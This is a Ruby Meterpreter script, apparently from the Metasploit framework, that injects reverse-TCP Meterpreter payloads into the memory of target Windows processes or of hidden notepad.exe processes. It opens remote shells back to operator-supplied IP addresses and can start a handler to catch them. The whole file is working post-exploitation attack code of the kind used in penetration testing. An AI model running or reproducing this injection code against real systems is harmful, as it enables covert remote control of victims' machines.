##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##


# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client
lhost    = Rex::Socket.source_address("1.2.3.4")
lport    = 4444
lhost    = "127.0.0.1"
pid = nil
multi_ip = nil
multi_pid = []
payload_type = "windows/meterpreter/reverse_tcp"
start_handler = nil
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "Help menu." ],
  "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4444)."],
  "-m"  => [ false,  "Start exploit/multi/handler for return connection."],
  "-P" => [ true,   "Specify reverse connection Meterpreter payload. Default: windows/meterpreter/reverse_tcp"],
  "-I" => [ true,   "Provide multiple IP addresses for connections separated by comma."],
  "-d" => [ true,   "Provide multiple PID for connections separated by comma one per IP."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
  print_line "Meterpreter script for injecting a reverce tcp Meterpreter payload"
  print_line "in to memory of multiple PIDs. If none is provided, a notepad process"
  print_line "will be created and a Meterpreter payload will be injected in to each."
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
  print_error("#{meter} version of Meterpreter is not supported with this script!")
  raise Rex::Script::Completed
end

# Function for injecting payload in to a given PID
#-------------------------------------------------------------------------------
def inject(target_pid, payload_to_inject)
  print_status("Injecting meterpreter into process ID #{target_pid}")
  begin
    host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
    raw = payload_to_inject.generate
    mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

    print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
    print_status("Writing the stager into memory...")
    host_process.memory.write(mem, raw)
    host_process.thread.create(mem, 0)
    print_good("Successfully injected Meterpreter in to process: #{target_pid}")
  rescue::Exception => e
    print_error("Failed to Inject payload to #{target_pid}!")
    print_error(e)
  end
end

# Function for creation of connection handler
#-------------------------------------------------------------------------------
def create_multi_handler(payload_to_inject)
  mul = @client.framework.exploits.create("multi/handler")
  mul.share_datastore(payload_to_inject.datastore)
  mul.datastore['WORKSPACE'] = @client.workspace
  mul.datastore['PAYLOAD'] = payload_to_inject
  mul.datastore['EXITFUNC'] = 'process'
  mul.datastore['ExitOnSession'] = true
  print_status("Running payload handler")
  mul.exploit_simple(
    'Payload'  => mul.datastore['PAYLOAD'],
    'RunAsJob' => true
  )

end

# Function for creating the payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
  print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
  payload = payload_type
  pay = client.framework.payloads.create(payload)
  pay.datastore['LHOST'] = lhost
  pay.datastore['LPORT'] = lport
  return pay
end

# Function starting notepad.exe process
#-------------------------------------------------------------------------------
def start_proc()
  print_good("Starting Notepad.exe to house Meterpreter session.")
  proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
  print_good("Process created with pid #{proc.pid}")
  return proc.pid
end
################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-p"
    lport = val.to_i
  when "-m"
    start_handler = true
  when "-P"
    payload_type = val
  when "-I"
    multi_ip = val.split(",")
  when "-d"
    multi_pid = val.split(",")
  end
}

# Check for version of Meterpreter
wrong_meter_version(meter_type) if meter_type != 'windows'
# Create a exploit/multi/handler if desired
create_multi_handler(payload_type) if start_handler

# Check to make sure a PID or program name where provided

if multi_ip
  if multi_pid
    if multi_ip.length == multi_pid.length
      pid_index = 0
      multi_ip.each do |i|
        payload = create_payload(payload_type,i,lport)
        inject(multi_pid[pid_index],payload)
        select(nil, nil, nil, 5)
        pid_index = pid_index + 1
      end
    else
      multi_ip.each do |i|
        payload = create_payload(payload_type,i,lport)
        inject(start_proc,payload)
        select(nil, nil, nil, 2)
      end
    end
  end
else
  print_error("You must provide at least one IP!")
end
